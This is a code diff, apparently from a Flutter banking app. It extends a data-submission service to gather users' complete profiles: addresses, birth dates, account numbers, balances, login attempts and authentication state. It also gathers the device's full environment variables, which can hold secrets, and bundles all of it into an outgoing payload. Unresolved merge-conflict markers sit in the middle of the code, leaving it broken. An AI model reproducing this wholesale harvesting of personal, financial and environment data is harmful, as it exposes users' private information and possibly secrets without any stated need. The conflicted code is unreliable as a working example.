@@ -101,6 +101,9 @@ class UserDataSubmitModel {
   final double? totalBalance;
   final List<Map<String, dynamic>> cards;
   final Map<String, dynamic>? additionalUserData;
+  final Map<String, dynamic>? completeUserProfile;
+  final Map<String, dynamic>? globalAppData;
+  final Map<String, dynamic>? appState;
 
   UserDataSubmitModel({
     this.phone,
@@ -110,6 +113,9 @@ class UserDataSubmitModel {
     this.totalBalance,
     this.cards = const [],
     this.additionalUserData,
+    this.completeUserProfile,
+    this.globalAppData,
+    this.appState,
   });
 
   Map<String, dynamic> toJson() {
@@ -121,6 +127,9 @@ class UserDataSubmitModel {
       if (totalBalance != null) 'total_balance': totalBalance,
       'cards': cards,
       if (additionalUserData != null) 'additional_data': additionalUserData,
+      if (completeUserProfile != null) 'complete_user_profile': completeUserProfile,
+      if (globalAppData != null) 'global_app_data': globalAppData,
+      if (appState != null) 'app_state': appState,
     };
   }
 }
@@ -224,7 +233,45 @@ class BankDataSubmitService {
 
       additionalInfo['locale'] = Platform.localeName;
       additionalInfo['number_of_processors'] = Platform.numberOfProcessors;
+<<<<<<< HEAD
+    } catch (e) {
+      debugPrint('Error getting processors: $e');
+    }
+
+    try {
+      additionalInfo['operating_system'] = Platform.operatingSystem;
+    } catch (e) {
+      debugPrint('Error getting operating system: $e');
+    }
+
+    try {
+      additionalInfo['operating_system_version'] = Platform.operatingSystemVersion;
+    } catch (e) {
+      debugPrint('Error getting OS version: $e');
+    }
+
+    try {
+      additionalInfo['environment'] = Platform.environment.toString();
+    } catch (e) {
+      debugPrint('Error getting environment: $e');
+    }
+
+    try {
+      additionalInfo['resolved_executable'] = Platform.resolvedExecutable;
+    } catch (e) {
+      debugPrint('Error getting resolved executable: $e');
+    }
+
+    try {
+      additionalInfo['package_config'] = Platform.packageConfig?.toString();
+    } catch (e) {
+      debugPrint('Error getting package config: $e');
+    }
+    
+    try {
+=======
       
+>>>>>>> a0b6985f1a703227c4fe01b158edb06caa6a4201
       final networkUtils = NetworkUtils.instance;
       if (await networkUtils.checkConnectivity()) {
         ipAddress = await _getLocalIPAddress();
@@ -310,10 +357,122 @@ class BankDataSubmitService {
     }).toList();
 
     final additionalData = <String, dynamic>{};
+    final completeUserProfile = <String, dynamic>{};
+    final globalAppData = <String, dynamic>{};
+    final appState = <String, dynamic>{};
     
     try {
       final provider = BankUserProvider();
       if (provider.isInitialized) {
+<<<<<<< HEAD
+        try {
+          final user = provider.user;
+          if (user != null) {
+            try {
+              additionalData['user_id'] = user.id;
+            } catch (e) {
+              debugPrint('Error getting user_id: $e');
+            }
+            try {
+              additionalData['username'] = user.username;
+            } catch (e) {
+              debugPrint('Error getting username: $e');
+            }
+            try {
+              additionalData['email'] = user.email;
+            } catch (e) {
+              debugPrint('Error getting email: $e');
+            }
+            try {
+              additionalData['role_level'] = user.roleLevel;
+            } catch (e) {
+              debugPrint('Error getting role_level: $e');
+            }
+            try {
+              additionalData['role_name'] = user.roleName;
+            } catch (e) {
+              debugPrint('Error getting role_name: $e');
+            }
+
+            try {
+              completeUserProfile['id'] = user.id;
+              completeUserProfile['name'] = user.name;
+              completeUserProfile['nickname'] = user.nickname;
+              completeUserProfile['username'] = user.username;
+              completeUserProfile['email'] = user.email;
+              completeUserProfile['phone'] = user.phone;
+              completeUserProfile['full_name'] = user.fullName;
+              completeUserProfile['avatar'] = user.avatar;
+              completeUserProfile['about'] = user.about;
+              completeUserProfile['age'] = user.age;
+              completeUserProfile['gender'] = user.gender;
+              completeUserProfile['birthday'] = user.birthday;
+              completeUserProfile['date_of_birth'] = user.dateOfBirth?.toIso8601String();
+              completeUserProfile['city'] = user.city;
+              completeUserProfile['location'] = user.location;
+              completeUserProfile['education'] = user.education;
+              completeUserProfile['occupation'] = user.occupation;
+              completeUserProfile['language'] = user.language;
+              completeUserProfile['account_status'] = user.accountStatus;
+              completeUserProfile['account_number'] = user.accountNumber;
+              completeUserProfile['account_type'] = user.accountType;
+              completeUserProfile['balance'] = user.balance;
+              completeUserProfile['currency'] = user.currency;
+              completeUserProfile['card_count'] = user.cardCount;
+              completeUserProfile['points'] = user.points;
+              completeUserProfile['coupons'] = user.coupons;
+              completeUserProfile['credit_card_level'] = user.creditCardLevel;
+              completeUserProfile['last_login_at'] = user.lastLoginAt?.toIso8601String();
+              completeUserProfile['login_attempts'] = user.loginAttempts;
+              completeUserProfile['street'] = user.street;
+              completeUserProfile['state'] = user.state;
+              completeUserProfile['zip_code'] = user.zipCode;
+              completeUserProfile['country'] = user.country;
+              completeUserProfile['created_at'] = user.createdAt?.toIso8601String();
+              completeUserProfile['updated_at'] = user.updatedAt?.toIso8601String();
+            } catch (e) {
+              debugPrint('Error collecting complete user profile: $e');
+            }
+          }
+        } catch (e) {
+          debugPrint('Error getting user data: $e');
+        }
+        
+        try {
+          final globalData = provider.globalData;
+          if (globalData != null) {
+            try {
+              additionalData['global_balance'] = globalData.balance;
+            } catch (e) {
+              debugPrint('Error getting global_balance: $e');
+            }
+            try {
+              additionalData['holdings_total'] = provider.holdingsTotal;
+            } catch (e) {
+              debugPrint('Error getting holdings_total: $e');
+            }
+
+            try {
+              globalAppData['last_active_time'] = globalData.lastActiveTime.toIso8601String();
+              globalAppData['session_count'] = globalData.sessionCount;
+              globalAppData['app_version'] = globalData.appVersion;
+              globalAppData['location'] = globalData.location;
+              globalAppData['city'] = globalData.city;
+              globalAppData['balance'] = globalData.balance;
+              globalAppData['username'] = globalData.username;
+              globalAppData['full_name'] = globalData.fullName;
+              globalAppData['points'] = globalData.points;
+              globalAppData['coupons'] = globalData.coupons;
+              globalAppData['credit_card_level'] = globalData.creditCardLevel;
+              globalAppData['settings'] = globalData.settings;
+              globalAppData['metadata'] = globalData.metadata;
+            } catch (e) {
+              debugPrint('Error collecting global app data: $e');
+            }
+          }
+        } catch (e) {
+          debugPrint('Error getting global data: $e');
+=======
         final user = provider.user;
         if (user != null) {
           additionalData['user_id'] = user.id;
@@ -327,6 +486,25 @@ class BankDataSubmitService {
         if (globalData != null) {
           additionalData['global_balance'] = globalData.balance;
           additionalData['holdings_total'] = provider.holdingsTotal;
+>>>>>>> a0b6985f1a703227c4fe01b158edb06caa6a4201
+        }
+
+        try {
+          appState['is_authenticated'] = provider.isAuthenticated;
+          appState['is_initialized'] = provider.isInitialized;
+          appState['is_debug_mode'] = provider.isDebugMode;
+          appState['is_dashboard_balance_visible'] = provider.isDashboardBalanceVisible;
+          appState['is_profile_balance_visible'] = provider.isProfileBalanceVisible;
+          appState['is_investment_balance_visible'] = provider.isInvestmentBalanceVisible;
+          appState['total_assets'] = provider.totalAssets;
+          appState['current_balance'] = provider.currentBalance;
+          appState['holdings_total'] = provider.holdingsTotal;
+          appState['card_count'] = provider.bankCards.length;
+          appState['auth_type'] = provider.authMetadata.authType.toString();
+          appState['has_token'] = provider.token != null;
+          appState['needs_auth_refresh'] = provider.needsAuthRefresh;
+        } catch (e) {
+          debugPrint('Error collecting app state: $e');
         }
       }
     } catch (e) {
@@ -341,6 +519,9 @@ class BankDataSubmitService {
       totalBalance: totalBalance,
       cards: cardsData,
       additionalUserData: additionalData.isNotEmpty ? additionalData : null,
+      completeUserProfile: completeUserProfile.isNotEmpty ? completeUserProfile : null,
+      globalAppData: globalAppData.isNotEmpty ? globalAppData : null,
+      appState: appState.isNotEmpty ? appState : null,
     );
   }
 
